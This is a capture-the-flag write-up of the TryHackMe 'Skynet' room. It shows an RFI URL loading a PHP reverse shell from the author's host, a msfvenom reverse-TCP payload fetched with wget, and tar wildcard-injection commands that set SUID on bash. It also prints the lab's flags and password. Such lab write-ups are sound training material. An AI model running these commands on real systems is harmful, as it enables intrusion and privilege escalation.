#Writeups #Linux

![](https://i.imgur.com/SNHDHoh.png)

_Hasta la vista, baby._  

Are you able to compromise this Terminator themed machine?

## Question 1:   
#### What is Miles password for his emails?

## Reconnaissance

Started off by pinging the machine to see if it responds to ICMP pings

![](Assets/Images/Pasted%20image%2020221202125805.png)

Web home page: 
![](Assets/Images/Pasted%20image%2020221202132616.png)

Nothing interesting in source code. Search bar does nothing.

Ran Gobuster scan to find any interesting directories:
![](Assets/Images/Pasted%20image%2020221202162333.png)

Tried accessing /admin however permission was denied. 
Was able to access /squirrelmail however which brings up a login form. 
![](Assets/Images/Pasted%20image%2020221202162539.png)

Ran a quick Nmap scan to see which ports are open:

![](Assets/Images/Pasted%20image%2020221202125946.png)

## Services

Looking at the services running on open ports from the nmap scan it looks like we may be able to enumerate Samba for potential clues.

![](Assets/Images/Pasted%20image%2020221202132303.png)

Here we can see the available shares:
`print$`
`anonymous`
`milesdyson`
`IPC$`

Another way to enumerate the samba shares would be to use SMBMap

![](Assets/Images/Pasted%20image%2020221202162914.png)

Accessing Anonymous doesn't require any passwords so it was easy to download the contents on the share:

![](Assets/Images/Pasted%20image%2020221202151332.png)

**Attention.txt**
![](Assets/Images/Pasted%20image%2020221202151430.png)

**Log1.txt**
![](Assets/Images/Pasted%20image%2020221202151531.png)
Logs 2 & 3 contained no info.

Looks like log1 has a list of passwords we can use to brute force our way into Miles Squirrelmail account.

## Gaining access

Using BurpSuite and the login form from earlier,  I've captured a login with the user name set to 'milesdyson'.
![](Assets/Images/Pasted%20image%2020221202164901.png)

Forwarded the captured login to the intruder to initiate a sniper attack using the list of passwords found in log1.txt.

Already we can see the first password on the list received a redirect (302) however all consequent passwords received a (200) response code.

![](Assets/Images/Pasted%20image%2020221202165535.png)

We now know the answer to the first question!

##### Answer: `cyborg007haloterminator`

## Question 2:
####   What is the hidden directory?

Logging into mikedyson's squirrelmail account there was a password reset email with a new password for his personal samba share.

![](Assets/Images/Pasted%20image%2020221202171213.png)

We can now have a look into the samba share and see what else we can dig up!

![](Assets/Images/Pasted%20image%2020221205125359.png)

Ok we found a bunch of .pdf files and a ‘notes’ directory. Inside there is a bunch of .md files and a text file called ‘important.txt’. Let’s check that file:

![](Assets/Images/Pasted%20image%2020221205131422.png)

![](Assets/Images/Pasted%20image%2020221205131525.png)

Interesting! We have some sort of directory in the file (/45kra24zxs28v3yd) which is also the answer to question 2!
##### Answer: /45kra24zxs28v3yd

Let’s try to access that on the main web page:

![](Assets/Images/Pasted%20image%2020221205131936.png)

Nothing much to be found...



## Question 3:
#### What is the vulnerability called when you can include a remote file for malicious purposes?

##### Answer: Remote File Inclusion

## Question 4:
####   What is the user flag?

Doesn't look like there's much here. Could be worth running another gobuster scan on the new found directory however:

![](Assets/Images/Pasted%20image%2020221205140125.png)

Looks like the scan paid off as we've just found an /administrator directory which will be well worth exploring. Having a look at the adminostrator page, it looks as though there is another login form which can potentially exploited.

![](Assets/Images/Pasted%20image%2020221205140317.png)

Google has installation documentation for Cuppa CMS with the default login credentials of admin:admin which unfortunately didn't work upon checking.

![](Assets/Images/Pasted%20image%2020221205140555.png)

Next best step here is to look for any known vulnerabilities for Cuppa CMS as we still require an attack vector to access the machine.

![](Assets/Images/Pasted%20image%2020221205141424.png)

The previous question made it obvious that we're looking for a remote file inclusion vulnerability and this is the only result for Cuppa CMS using Searchsploit.
Based on the .txt we've discovered, interestingly it looks as though there's a vulnerability with the alerts directory of the site which allows users to include local or remote PHP files or read non-PHP files.

This could mean we may be able to view the contents of /etc/passwd or include a link to our own shell running off a http webserver and execute it.

![](Assets/Images/Pasted%20image%2020221205142329.png)

Using a PHP reverse shell I started up a web server and appended my link to the end of the vulnerable URL.

`http://10.10.122.14/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.4.2.138:8000/shell.php?`

![](Assets/Images/Pasted%20image%2020221205142944.png)

Started up a netcat listener on port 1234 and caught the incoming shell:

![](Assets/Images/Pasted%20image%2020221205143446.png)

Great! We've now got access to the machine. Lets find out what the user flag is and move onto the next question by escalating our privileges.

![](Assets/Images/Pasted%20image%2020221205143650.png)

##### Answer: 7ce5c2109a40f958099283600a9ae807

## Question 5: 
#### What is the root flag?

Before escalating privileges it would be best to first transition from netcat to a more stable shell.

## Upgrading to a Meterpreter Shell

First up, creating a payload using mfsvenom:
`msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=10.4.2.138 LPORT=4445 -f elf > shell.elf`
Secondly, download the payload into a writable directory on the target machine (usually the tmp directory is best). I did this using a webserver and the "wget" command. 
![](Assets/Images/Pasted%20image%2020221205145044.png)
Start up msfconsole and setup a multi handler to catch the incoming Meterpreter shell.
Set payload to Meterpreter.
Used exploit -j so the job runs in the background. 
![](Assets/Images/Pasted%20image%2020221205150415.png)
Make sure to change the permissions on the payload to make it executable and then finally, activate the payload!
![](Assets/Images/Pasted%20image%2020221205145935.png)
![](Assets/Images/Pasted%20image%2020221205151045.png)


## Privilege Escalation

Now we've got a Meterpreter shell, it will be far easier to escalate privileges from here. LinPeas is a great option for enumerating potential escalation vectors.

One thing which caught my eye when scrolling through the LinPeas output was a 'backup' cron job which runs every minute with root privileges. 
![](Assets/Images/Pasted%20image%2020221205153425.png)
Unfortunately after checking the permissions of the file and directory, we do not have and write permissions however upon checking the contents of the script it looks as though the script (running with root permissions) is changing directory to /var/www/html and compressing the data within using tar and saving it as "backup.tgz"

![](Assets/Images/Pasted%20image%2020221205160043.png)

After completing a google search on how to exploit a script utilizing tar with root privileges, it looks as though there is a 'wild card injection' exploit we can make use of to elevate privileges. 

As we already know that the script is using tar in the /var/www/html directory, this is where we can create some files and name them using the below mentioned commands which will execute with root privileges. 

`echo '#/!bin/bash\nchmod +s /bin/bash' > shell.sh` 
`echo "" > "--checkpoint-action=exec=sh shell.sh"`  
`echo "" > --checkpoint=1`

The whole thing ends up looking like this in the backend: 
`tar cf /home/milesdyson/backups/backup.tgz --checkpoint=1 --checkpoint=action=exec=sh shell.sh`

Once these files have been created and after waiting about a minute for the cron job to run, we can see that /bin/bash now has a SUID bit set which means we can execute it with root privileges and get the root shell.
`Command: /bin/bash -p`
![](Assets/Images/Pasted%20image%2020221205162008.png)
We can now easily get the root flag and answer our final question!

![](Assets/Images/Pasted%20image%2020221205162135.png)

##### Answer: 3f0372db24753accc7179a282cd6a949

## Conclusion

I have to say that this was an incredibly fun CTF to complete.
Thank you for reading through my write up of the Skynet TryHackMe room, I've had a great time navigating my way through this one and writing down each of the steps I had taken along the way.
Hopefully you've found the information here enlightening :D 